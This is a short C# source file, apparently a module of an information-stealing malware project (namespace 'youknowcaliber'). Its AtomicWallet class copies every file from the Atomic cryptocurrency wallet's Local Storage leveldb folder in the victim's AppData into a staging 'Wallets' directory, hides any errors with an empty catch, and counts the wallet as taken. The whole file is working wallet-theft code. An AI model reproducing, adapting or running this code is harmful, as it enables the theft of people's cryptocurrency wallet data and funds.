﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class AtomicWallet
	{
		public static void AtomicStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\atomic\\Local Storage\\leveldb\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + AtomicWallet.AtomDir);
					fileInfo.CopyTo(directorypath + AtomicWallet.AtomDir + fileInfo.Name);
				}
				AtomicWallet.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
	}
}
